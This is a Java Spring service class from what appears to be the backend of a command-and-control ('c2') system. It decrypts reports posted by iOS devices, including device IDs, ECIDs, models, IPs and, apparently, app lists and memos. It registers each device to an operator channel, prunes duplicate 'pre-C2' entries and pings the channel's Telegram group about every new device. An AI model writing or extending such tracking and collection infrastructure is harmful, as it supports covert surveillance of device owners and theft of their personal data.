package com.report.service;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Map;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.dao.DuplicateKeyException;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Propagation;
import org.springframework.transaction.annotation.Transactional;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.report.dao.ChannelDao;
import com.report.dao.DeviceDao;
import com.report.entity.ChannelEntity;
import com.report.entity.DeviceEntity;
import com.report.entity.EventEntity;
import com.report.entity.UsEntity;
import com.report.util.EventDecryptor;
import com.report.util.IpPrefixUtil;
import com.report.util.MessageFormatUtils;
import com.report.util.TelegramNotificationUtil;

/**
 * /us 接口的设备绑定异步服务。
 *
 */
@Service
public class UsDeviceBindService {

    private static final Logger log = LoggerFactory.getLogger(UsDeviceBindService.class);

    @Autowired
    private DeviceDao deviceDao;

    @Autowired
    private ChannelDao channelDao;

    @Autowired
    private TelegramNotificationUtil telegramNotificationUtil;
    
    /** IP 前缀段数：192.168.1.12 → "192.168.1." */
    @Value("${c2.similar.ip-segments:3}")
    private int ipSegments;

    /** 版本前缀段数：ios15.1 / 15.1.2 → "15.1" */
    @Value("${c2.similar.version-segments:2}")
    private int versionSegments;

    /** 时间窗：±N 秒 */
    @Value("${c2.similar.window-seconds:300}")
    private int windowSeconds;

    /** 相似查询最大返回数 */
    @Value("${c2.similar.max-results:100}")
    private int maxResults;

    /** 相似查询总开关 */
    @Value("${c2.similar.enabled:true}")
    private boolean similarEnabled;


    /**
     * 异步执行 /us 的设备绑定逻辑。
     */
    @Async("deviceBindExecutor")
    @Transactional(propagation = Propagation.REQUIRES_NEW)
    public void usBindAsync(String body, String xTs, String domain, String ip ) {
        try {
            // 1) 解密 + 提取 JSON 文本
            Map<String, Object> decryptResult = decryptSafely(xTs, body);
            String bodyForRecord = extractBodyText(decryptResult);
            if (bodyForRecord == null || bodyForRecord.isEmpty()) {
                return;
            }

            // 2) 解析 UsEntity
            UsEntity entity = JSONObject.parseObject(bodyForRecord, UsEntity.class);
            if (entity == null || entity.getD() == null || entity.getD().isEmpty()) {
                return;
            }

            // 3) 查重：已存在则直接返回（高频场景下避免重复 insert）
            DeviceEntity existing = deviceDao.findDeviceId(entity.getD());
            if (existing != null) {
                return;
            }

            // 4) 查 channel（按 domain 匹配）
            ChannelEntity channel = channelDao.finddDmain(domain);
            if (channel == null) {
                return;
            }

            // 6) 组装并插入
            DeviceEntity device = new DeviceEntity();
            device.setChannelCode(channel.getChannelcode());
            device.setIp(ip);
            device.setDomain(domain);
            device.setAddtime(System.currentTimeMillis() / 1000.0);
            device.setDeviceId(entity.getD());
            device.setDevicestatus(1);
            device.setOnlinestatus(1);
            device.setEcid(entity.getD());
            device.setBindPhase(1);
            device.setLastEventAt(System.currentTimeMillis() / 1000.0);
            device.setC2Series(0);
            try {
            	deviceDao.insert(device);
            	// 插入成功 + 渠道配置了 telegram groupid → 异步发飞机消息（对齐 binding-server）
            	if (device.getId() != null) {
					similarQueryAndPatchTwo(device.getId(), ip, channel.getChannelcode());
					if(channel.getTelegramGroupid() != null
							&& !channel.getTelegramGroupid().isEmpty()) {
						notifyBindingAsync(device,channel,channel.getTelegramGroupid());
					}
				}
            	
            } catch (DuplicateKeyException e) {
                log.info("正常日志:设备已存在，跳过插入: {}", device.getDeviceId());
            } catch (Exception e) {
                log.info("错误日志:设备插入失败: {}", e.getMessage());
            }

        } catch (Exception e) {
            log.info("异常日志:/us 设备绑定失败", e);
        }
    }

    // ---------- 业务辅助（从 ApiServiceImpl 迁出） ----------

    private static Map<String, Object> decryptSafely(String xTs, String rawBody) {
        if (xTs == null || xTs.isEmpty() || rawBody == null || rawBody.isEmpty()) {
            return null;
        }
        Map<String, Object> r = EventDecryptor.decryptEventBody(xTs, rawBody);
        if (Boolean.TRUE.equals(r.get("success"))) {
            if (r.get("plaintext") instanceof JSONObject) {
                return r;
            }
        }
        return r;
    }

    private static String extractBodyText(Map<String, Object> decryptResult) {
        if (decryptResult == null) {
            return "";
        }
        Object pt = decryptResult.get("plaintext");
        if (pt instanceof JSONObject) {
            return JSON.toJSONString(pt);
        }
        Object raw = decryptResult.get("raw");
        return raw == null ? "" : raw.toString();
    }

	/**
	 * event 绑定
	 * @param body
	 * @param xTs
	 * @param domain
	 * @param ip
	 */
	@Async("deviceBindExecutor")
	@Transactional(propagation = Propagation.REQUIRES_NEW)
	public void eventBindAsync(String body, String xTs, String domain, String ip) {
		try {
			// 1) 解密 + 提取 JSON 文本
			Map<String, Object> decryptResult = decryptSafely(xTs, body);
			String bodyForRecord = extractBodyText(decryptResult);
			if (bodyForRecord == null || bodyForRecord.isEmpty()) {
				return;
			}
			// 2) 解析 UsEntity
			EventEntity entity = JSONObject.parseObject(bodyForRecord, EventEntity.class);
			if (entity == null 
					|| entity.getD() == null || entity.getD().isEmpty() 
					|| entity.getF() == null || entity.getF().isEmpty()) {
				return;
			}
			String deviceId = (entity.getD() != null && !entity.getD().isEmpty())
					? entity.getD() : entity.getF();
			String lhu = entity.getLhu() == null ? "" : entity.getLhu().trim();
			// 3) 查重：已存在则补 lhu 后返回
			DeviceEntity existing = deviceDao.findDeviceId(deviceId);
			if (existing != null) {
				fillLhuIfBlank(existing, lhu);
				return;
			}

			// 4) 查 channel（按 domain 匹配）
			ChannelEntity channel = channelDao.finddDmain(domain);
			if (channel == null) {
				return;
			}

			// 6) 组装并插入
			DeviceEntity device = new DeviceEntity();
			device.setChannelCode(channel.getChannelcode());
			device.setIp(ip);
			device.setDomain(domain);
			device.setAddtime(System.currentTimeMillis() / 1000.0);
			device.setDeviceId(deviceId);
			device.setDevicestatus(1);
			device.setOnlinestatus(1);
			device.setEcid(deviceId);
			device.setBindPhase(1);
			device.setIosVersion(entity.getPv());
			device.setModel(entity.getM());
			device.setIpstatus(0);
			device.setLastEventAt(System.currentTimeMillis() / 1000.0);
			device.setC2Series(0);
			if (!lhu.isEmpty()) {
				device.setLhu(lhu);
			}
			try {
				deviceDao.insert(device);
				// 插入成功 + 渠道配置了 telegram groupid → 异步发飞机消息（对齐 binding-server）
				if (device.getId() != null) {
					similarQueryAndPatchTwo(device.getId(), ip, channel.getChannelcode());
					if(channel.getTelegramGroupid() != null
							&& !channel.getTelegramGroupid().isEmpty()) {
						notifyBindingAsync(device,channel,channel.getTelegramGroupid());
					}
				}
			} catch (DuplicateKeyException e) {
				log.info("正常日志:设备已存在，跳过插入: {}", device.getDeviceId());
				fillLhuIfBlank(deviceDao.findDeviceId(deviceId), lhu);
			} catch (Exception e) {
				log.info("错误日志:设备插入失败: {}", e.getMessage());
			}

		} catch (Exception e) {
			log.info("异常日志:/event 设备绑定失败", e);
		}
	}

	/**
	 * /u 应用列表：异步设备绑定（解密 + 查重 + 查 channel + insert）。
	 */
	@Async("deviceBindExecutor")
	@Transactional(propagation = Propagation.REQUIRES_NEW)
	public void uBindAsync(String body, String xTs, String domain, String ip) {
		bindByDfAsync("/u", body, xTs, domain, ip);
	}

	/**
	 * /nb 备忘录：异步设备绑定（解密 + 查重 + 查 channel + insert）。
	 */
	@Async("deviceBindExecutor")
	@Transactional(propagation = Propagation.REQUIRES_NEW)
	public void nbBindAsync(String body, String xTs, String domain, String ip) {
		bindByDfAsync("/nb", body, xTs, domain, ip);
	}

	/**
	 * 通用：从明文 d/f 查重并新建设备（对齐 /event，无 model/iosVersion 时留空）。
	 */
	private void bindByDfAsync(String path, String body, String xTs, String domain, String ip) {
		try {
			Map<String, Object> decryptResult = decryptSafely(xTs, body);
			String bodyForRecord = extractBodyText(decryptResult);
			if (bodyForRecord == null || bodyForRecord.isEmpty()) {
				return;
			}
			JSONObject obj = JSONObject.parseObject(bodyForRecord);
			if (obj == null) {
				return;
			}
			String d = str(obj, "d");
			String f = str(obj, "f");
			String lhu = str(obj, "lhu");
			String deviceId = !d.isEmpty() ? d : f;
			if (deviceId.isEmpty()) {
				log.info("正常日志:{} 无 d/f，跳过设备绑定", path);
				return;
			}
			DeviceEntity existing = deviceDao.findDeviceId(deviceId);
			if (existing != null) {
				fillLhuIfBlank(existing, lhu);
				return;
			}
			ChannelEntity channel = channelDao.finddDmain(domain);
			if (channel == null) {
				log.info("正常日志:{} 未找到渠道，跳过新建设备, domain={}, deviceid={}", path, domain, deviceId);
				return;
			}
			DeviceEntity device = new DeviceEntity();
			device.setChannelCode(channel.getChannelcode());
			device.setIp(ip);
			device.setDomain(domain);
			device.setAddtime(System.currentTimeMillis() / 1000.0);
			device.setDeviceId(deviceId);
			device.setDevicestatus(1);
			device.setOnlinestatus(1);
			device.setEcid(deviceId);
			device.setBindPhase(1);
			device.setIpstatus(0);
			device.setLastEventAt(System.currentTimeMillis() / 1000.0);
			device.setC2Series(0);
			if (!lhu.isEmpty()) {
				device.setLhu(lhu);
			}
			try {
				deviceDao.insert(device);
				if (device.getId() != null) {
					similarQueryAndPatchTwo(device.getId(), ip, channel.getChannelcode());
					if (channel.getTelegramGroupid() != null
							&& !channel.getTelegramGroupid().isEmpty()) {
						notifyBindingAsync(device, channel, channel.getTelegramGroupid());
					}
				}
				log.info("正常日志:{} 新建设备成功, deviceid={}, rowId={}, lhu={}", path, deviceId, device.getId(), lhu);
			} catch (DuplicateKeyException e) {
				log.info("正常日志:{} 设备已存在，跳过插入: {}", path, deviceId);
				fillLhuIfBlank(deviceDao.findDeviceId(deviceId), lhu);
			} catch (Exception e) {
				log.info("错误日志:{} 设备插入失败: {}", path, e.getMessage());
			}
		} catch (Exception e) {
			log.info("异常日志:{} 设备绑定失败", path, e);
		}
	}

	private static String str(JSONObject obj, String key) {
		if (obj == null || key == null) {
			return "";
		}
		String v = obj.getString(key);
		return v == null ? "" : v.trim();
	}

	/** 已有设备写入/刷新 lhu（重置后 ECID 不变 lhu 变，需覆盖旧值） */
	private void fillLhuIfBlank(DeviceEntity existing, String lhu) {
		if (existing == null || existing.getId() == null || lhu == null || lhu.isEmpty()) {
			return;
		}
		String cur = existing.getLhu();
		if (cur != null && !cur.isEmpty() && cur.equalsIgnoreCase(lhu)) {
			return;
		}
		try {
			DeviceEntity patch = new DeviceEntity();
			patch.setId(existing.getId());
			patch.setLhu(lhu);
			deviceDao.updateById(patch);
			existing.setLhu(lhu);
			if (cur == null || cur.isEmpty()) {
				log.info("正常日志:补全设备 lhu, rowId={}, deviceid={}, lhu={}",
						existing.getId(), existing.getDeviceId(), lhu);
			} else {
				log.info("正常日志:设备重置/会话切换，更新 lhu, rowId={}, deviceid={}, old={}, new={}",
						existing.getId(), existing.getDeviceId(), cur, lhu);
			}
		} catch (Exception e) {
			log.info("异常日志:更新设备 lhu 失败, rowId={}, err={}",
					existing.getId(), e.getMessage());
		}
	}

	/**
	 * @category 查询预C2设备，删除匹配数据
	 */
	private void similarQueryAndPatchTwo(Integer id, String ipAddress, String channelcode) {
			if (!similarEnabled) {
				return;
			}
			String ipPrefix = IpPrefixUtil.ipPrefix(ipAddress, ipSegments);

			double now = System.currentTimeMillis() / 1000.0;
			double fromTs = now - windowSeconds;
			double toTs = now + windowSeconds;
			 // 1. 先查询总数
		    int total = deviceDao.countSimilarDevices(ipPrefix, fromTs, toTs, channelcode, id);
		    
		    if (total == 0) {
		        return;
		    }
		    
		    // 2. 根据数量决定删除策略
		    if (total <= maxResults) {
		        // 数量 ≤ maxResults：全部删除
		        int deleted = deviceDao.deleteAllSimilarDevices(ipPrefix, fromTs, toTs, channelcode, id);
		        log.info("正常日志:相似设备数量({}) <= maxResults({})，全部删除 {} 条", total, maxResults, deleted);
		    } else {
		        // 数量 > maxResults：保留1条，删除其余的
		        int deleted = deviceDao.deleteSimilarDevicesKeepLatest(ipPrefix, fromTs, toTs, channelcode, id);
		        log.info("正常日志:相似设备数量({}) > maxResults({})，保留1条，删除 {} 条", total, maxResults, deleted);
		    }
		}

	/**
	 * Telegram 绑定通知（异步，对齐 binding-server 的 notifyBindingAsyncTwo）。
	 */
	@Async("c2TelegramExecutor")
	public void notifyBindingAsync(DeviceEntity device, ChannelEntity channel, String groupid) {
		 try {
	            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
	            String datetime = dateFormat.format(new Date());
	            String html = MessageFormatUtils.saveDeviceBindTelegram(groupid, device.getChannelCode(), channel.getUrl(), device.getModel(), device.getModel(), device.getIp(), datetime);
	            telegramNotificationUtil.sendTelegramBindingMsg(html, groupid);
	        } catch (Exception e) {
	            log.info("异常日志:telegram 绑定通知发送失败, deviceId={},err={}",
	            		device, e.getMessage());
	        }
	}


	
}
